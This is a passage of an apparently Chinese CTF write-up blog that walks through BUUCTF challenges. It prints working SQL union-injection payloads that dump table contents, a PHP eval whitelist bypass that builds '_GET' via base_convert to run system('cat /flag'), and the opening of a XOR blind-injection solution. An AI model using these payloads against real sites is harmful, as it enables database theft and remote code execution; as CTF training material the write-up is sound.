<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">title=-<span class="number">1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;</span></span><br><span class="line">&amp;content=<span class="number">2</span></span><br><span class="line">&amp;ac=add</span><br><span class="line"></span><br><span class="line">广告名 	广告内容 	状态</span><br><span class="line">ads,users	<span class="number">3</span>	待管理确认			<span class="comment"># 发聩了表名</span></span><br></pre></td></tr></table></figure>

<p>这里有个问题，列名，这个表没有……    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<p>这整个SQL很难读懂，简单拆分下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a</span><br><span class="line">其中，相当于<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tables</span><br><span class="line">一个表格：</span><br><span class="line">相当于：<span class="keyword">select</span>输出三个列名，使用<span class="keyword">union</span>联合查询，查询users表</span><br><span class="line"></span><br><span class="line">语句<span class="number">1</span>：</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users</span><br><span class="line">这个用法需要十分的注意下，也是需要测试的。它们外面的a是别名。</span><br><span class="line"></span><br><span class="line">假设：</span><br><span class="line">	语句<span class="number">1</span>：<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">	语句<span class="number">2</span>：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo</span><br><span class="line">	想联合这两个语句，就必须两<span class="keyword">select</span>对应的结果列数相等。</span><br><span class="line"></span><br><span class="line">语句<span class="number">2</span>：</span><br><span class="line">上面的复杂语句使用a(别名)代替</span><br><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> a</span><br><span class="line">这个部分的作用和group_concat有着莫大的关系。</span><br><span class="line">这个函数是聚合输出一列的值。</span><br><span class="line">假设：</span><br><span class="line">	表：<span class="keyword">user</span></span><br><span class="line">	id	name</span><br><span class="line">	<span class="number">1</span>	小明</span><br><span class="line">	<span class="number">2</span>	小刚</span><br><span class="line">	<span class="number">3</span>	小吴</span><br><span class="line">	使用聚合输出：<span class="keyword">select</span> group_concat(name) <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line">	输出的结果一定是：</span><br><span class="line">		小明,小刚,小吴</span><br></pre></td></tr></table></figure>

<p>经过上面一通解析，相信再怎么看不懂的人也都看懂了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个和上面差不多，只是换了个输出列而已。as也是写别名的意思。</p>
<p>经过这最后一次，就能得到flag了。</p>
<h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>总结的来讲，这道题是在不断的测试注入点，先是用户名密码的注册，后是申请广告的时候的标题和申请内容的注入，最后是申请后id号的注入。</p>
<p>测注入的目的至始至终只有一个，那就是：看看哪些能和数据库查询直接挂钩，只要挂钩，就能尝试注入。</p>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h2 id="原始信息-22"><a href="#原始信息-22" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="解题-22"><a href="#解题-22" class="headerlink" title="解题"></a>解题</h2><p>遇事不决，白盒分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="comment">//长度限制</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//限制字符串，黑名单</span></span><br><span class="line">    <span class="comment">//不限制的字符串有：(),&#123;&#125;,_,-,^,$,&#x27;,&#x27;</span></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="comment">//黑名单过滤</span></span><br><span class="line">    <span class="comment">//m：支持换行匹配</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="comment">// 从$content中查找函数名，并且存储在$used_funcs当中</span></span><br><span class="line">    <span class="comment">// 它会将匹配到的所有函数名存储到$used_funcs[0]当中</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="comment">// 将函数名和对应的值进行匹配</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="comment">//只要匹配不上上面的列出的函数名，就一定截断程序执行</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="comment">// 最终目标，输出我们想要的东西的执行结果</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>eval是我们想要利用的点，但怎么做才能绕开诸多限制达到这里是个十分急需解决的问题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">取出看似有用的函数名</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(): 在不同的进制之间转换一个数字的字符串表示。</span><br><span class="line"><span class="title function_ invoke__">bindec</span>(): 将一个二进制数转换为其十进制表示。</span><br><span class="line"><span class="title function_ invoke__">ceil</span>(): 对一个数进行向上取整。</span><br><span class="line"><span class="title function_ invoke__">decbin</span>(): 将一个十进制数转换为其二进制表示。</span><br><span class="line"><span class="title function_ invoke__">dechex</span>(): 将一个十进制数转换为其十六进制表示。</span><br><span class="line"><span class="title function_ invoke__">decoct</span>(): 将一个十进制数转换为其八进制表示。</span><br><span class="line"><span class="title function_ invoke__">exp</span>(): 计算幂函数的指数值。</span><br><span class="line"><span class="title function_ invoke__">hexdec</span>(): 将一个十六进制数转换为其十进制表示。</span><br></pre></td></tr></table></figure>

<p>限制条件</p>
<ul>
<li><p>长度80字符</p>
</li>
<li><p>必须使用限定的php函数</p>
</li>
<li><p>传入的参数只有c</p>
</li>
</ul>
<p>白盒审计的三关卡</p>
<h3 id="关卡1"><a href="#关卡1" class="headerlink" title="关卡1"></a>关卡1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路分为两种：</p>
<ol>
<li>尝试使用最短字符串绕过（难）</li>
<li>尝试使用特殊的函数进行绕过（方法可行）</li>
</ol>
<h3 id="关卡2"><a href="#关卡2" class="headerlink" title="关卡2"></a>关卡2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//限制字符串，黑名单</span></span><br><span class="line"><span class="comment">//不限制的字符串有：(),&#123;&#125;,_,-,^,$,&#x27;,&#x27;</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line"><span class="comment">//黑名单过滤</span></span><br><span class="line"><span class="comment">//m：支持换行匹配</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关卡3"><a href="#关卡3" class="headerlink" title="关卡3"></a>关卡3</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="comment">// 从$content中查找函数名，并且存储在$used_funcs当中</span></span><br><span class="line"><span class="comment">// 它会将匹配到的所有函数名存储到$used_funcs[0]当中</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line"><span class="comment">// 将函数名和对应的值进行匹配</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">    <span class="comment">//只要匹配不上上面的列出的函数名，就一定截断程序执行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遇到一位<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42551635/article/details/116501841">十分聪明的大佬</a>，他的解决思路大概是这样子的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=<span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b])&amp;a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure>

<p>然后利用进制转换进一步的修饰即可得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=_GET;(<span class="variable">$_GET</span>)&#123;pi&#125;(<span class="variable">$_GET</span>)&#123;abs&#125;&amp;pi=system&amp;abs=cat /flag</span><br><span class="line"><span class="comment"># 稍微拆分下上面的语句：</span></span><br><span class="line">    <span class="variable">$pi</span> = <span class="string">&#x27;_GET&#x27;</span></span><br><span class="line">    (<span class="variable">$_GET</span>)&#123;pi&#125; &lt;=&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;pi&#x27;</span>]</span><br><span class="line">    (<span class="variable">$_GET</span>)&#123;abs&#125;&lt;=&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;abs&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据get的那种方法，稍微变式GET方法</span></span><br><span class="line"><span class="variable">$$pi</span>&#123;pi&#125;<span class="variable">$$pi</span>&#123;abs&#125;&amp;pi=system&amp;abs=cat /flag</span><br><span class="line">    <span class="comment"># 再次解读下</span></span><br><span class="line">    <span class="variable">$$pi</span>&#123;pi&#125;	&lt;=&gt;	<span class="variable">$_GET</span>[<span class="string">&#x27;pi&#x27;</span>]</span><br><span class="line">    <span class="variable">$$pi</span>&#123;abs&#125;	&lt;=&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;abs&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终进行合并</span></span><br><span class="line">c=<span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br><span class="line">	<span class="comment">#再次解读下：</span></span><br><span class="line">    <span class="comment">// 利用36进制转换</span></span><br><span class="line">    <span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; hex2bin</span><br><span class="line">    <span class="comment">// 转换10进制为16进制</span></span><br><span class="line">    <span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)	=&gt; <span class="number">5</span>f474554</span><br><span class="line">    <span class="comment">// 合并起来转换</span></span><br><span class="line">    <span class="title function_ invoke__">hex2bin</span>(<span class="number">5</span>f474554) =&gt; _GET</span><br></pre></td></tr></table></figure>

<p>核心的利用点是使用get参数代替了函数名和传参值，并且使用了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>的形式跳过了方括号限制。</p>
<h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>学习了36进制转换，以及</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">利用<span class="keyword">eval</span>()函数对字符串进行类似于<span class="variable">$pi</span>=xxx的赋值操作。</span><br><span class="line">还有跨越方括号的障碍完成获取<span class="variable">$_GET</span>参数的值等等。</span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><h2 id="原始信息-23"><a href="#原始信息-23" class="headerlink" title="原始信息"></a>原始信息</h2><p>题目提示的信息很少，差不多：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">首先是一个网站<span class="number">5</span>个按钮，一个账户登录，分别是如下的url：</span><br><span class="line">用户访问指定id的url</span><br><span class="line">http:<span class="comment">//00a817db-1c3d-4e95-88a1-38b20e8960f8.node4.buuoj.cn:81/search.php?id=1</span></span><br><span class="line">用户登录的url</span><br><span class="line">http:<span class="comment">//00a817db-1c3d-4e95-88a1-38b20e8960f8.node4.buuoj.cn:81/check.php?username=1&amp;password=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试了一番：</span></span><br><span class="line">	<span class="number">1</span>.无法使用堆叠注入（限制union）</span><br><span class="line">	<span class="number">2</span>.无法使用报错注入（非数据库原始报错信息）</span><br><span class="line">	<span class="number">3</span>.无法使用时间盲注（费时费力，下面测试的时候跑个flag都十分的费劲）</span><br><span class="line">	<span class="number">4</span>.直接在账密上使用布尔盲注容易出擦子，采用id上的注入</span><br></pre></td></tr></table></figure>



<h2 id="解题-23"><a href="#解题-23" class="headerlink" title="解题"></a>解题</h2><p>解题前，先记下返回的值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面全是针对search.php的：</span></span><br><span class="line"><span class="built_in">id</span>=1	NO! Not this! Click others~~~</span><br><span class="line"><span class="built_in">id</span>=2	yingyingying~ Not this as well~~</span><br><span class="line"><span class="built_in">id</span>=3	Ohhh You find the flag <span class="built_in">read</span> on!</span><br><span class="line"><span class="built_in">id</span>=4	OK OK I will tell you,just <span class="keyword">in</span> the next! really~~~~</span><br><span class="line"><span class="built_in">id</span>=5	</span><br><span class="line">You are too naive!How can I give it to you? So,why not take a look at the sixth one?But <span class="built_in">where</span> is it?</span><br><span class="line"><span class="built_in">id</span>=6	Clever! But not this table.</span><br><span class="line"><span class="comment">#从下面往后，全是报错：</span></span><br><span class="line"><span class="built_in">id</span>=7	ERROR！！！</span><br><span class="line"><span class="built_in">id</span>=0	ERROR！！！</span><br><span class="line"><span class="built_in">id</span>=-1	ERROR！！！</span><br><span class="line"></span><br><span class="line">有一种特殊的报错，是Error! &lt;br&gt;,就目前观察来看，是符合当前注入的SQL查询错误。</span><br><span class="line"></span><br><span class="line">再补充下异或得到的值：</span><br><span class="line">1^0	1</span><br><span class="line">1^1	0</span><br><span class="line">1^2 3</span><br><span class="line">1^3	2</span><br><span class="line">1^4	5</span><br><span class="line">1^5 4</span><br><span class="line">1^6 7</span><br><span class="line">1^7 6</span><br><span class="line"></span><br><span class="line">一般来讲，1^<span class="literal">true</span>=0,1^<span class="literal">false</span>=1</span><br><span class="line">这是异或注入的原理</span><br><span class="line">也就是说，我们经常使用到的是：</span><br><span class="line">1^(<span class="literal">true</span>)=0		ERROR！！！</span><br><span class="line">1^(<span class="literal">false</span>)=1		NO! Not this! Click others~~~</span><br><span 